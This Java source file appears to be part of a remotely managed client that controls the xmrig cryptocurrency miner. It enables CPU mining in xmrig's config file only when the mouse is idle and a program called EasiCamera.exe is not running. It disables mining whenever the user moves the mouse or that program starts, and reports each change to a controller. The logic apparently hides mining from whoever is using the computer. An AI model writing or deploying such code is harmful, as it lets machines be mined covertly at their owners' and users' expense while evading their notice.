package client.main;

import universal.FileIO;
import universal.Out;

import java.awt.*;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.util.TimerTask;

public class AutoSwitch extends TimerTask {
    private static Point lsMousePoint=MouseInfo.getPointerInfo().getLocation();
    boolean running=true;
    int count=0;
    int cameraPausePeriod=0;
    public AutoSwitch(){
        AXMain.connect.writeNonBlocked("state mining");
    }
    @Override
    public void run(){
        Point nowLoc=MouseInfo.getPointerInfo().getLocation();
        if (AXMain.printToStdout){
            Out.sayWithTimeLn("Check mouse location"+nowLoc+" s:"+lsMousePoint);
        }
        boolean ecRunning=isProcessExist("EasiCamera.exe");
        if (nowLoc.distance(lsMousePoint)>10){
            updateState(false);
            cameraPausePeriod=20;
            count=0;
        }else if (ecRunning&&cameraPausePeriod<23) {
            updateState(false);
            cameraPausePeriod++;
            count=0;
        }else if (!ecRunning){
            cameraPausePeriod=0;
        }else{
            if (count<2){
                count++;
            }else if (count==2) {
                updateState(true);
                count++;
            }
//            Out.sayWithTimeLn("count:"+count);
        }
        lsMousePoint.setLocation(nowLoc);
    }
    public void updateState(boolean running){
        if (running==this.running)
            return;
        try {
            String fileContent = FileIO.read("D:\\xmrig\\config.json");
            if (running) {
                FileIO.write("D:\\xmrig\\config.json", fileContent.replace("\"cpu\": {\n" +
                        "        \"enabled\": false,", "\"cpu\": {\n" +
                        "        \"enabled\": true,"));
                AXMain.connect.writeNonBlocked("state mining");
                Out.sayWithTimeLn("Start.");
            } else {
                FileIO.write("D:\\xmrig\\config.json", fileContent.replace("\"cpu\": {\n" +
                        "        \"enabled\": true,", "\"cpu\": {\n" +
                        "        \"enabled\": false,"));
                AXMain.connect.writeNonBlocked("state hang-up");
                Out.sayWithTimeLn("Stop.");
            }
            this.running=running;
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public boolean isProcessExist(String name){
        try{
            Process process=Runtime.getRuntime().exec("tasklist /FI \"IMAGENAME eq EasiCamera.exe\"");
            BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(process.getInputStream()));
            String tStr="";
            StringBuffer result=new StringBuffer();
            while ((tStr= bufferedReader.readLine())!=null){
                result.append(tStr+"\n");
            }
            if (AXMain.printToStdout){
                Out.sayWithTimeLn("ProcessScan:"+result+"result:"+result.toString().contains("=="));
            }
            return result.toString().contains("==");
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }
}
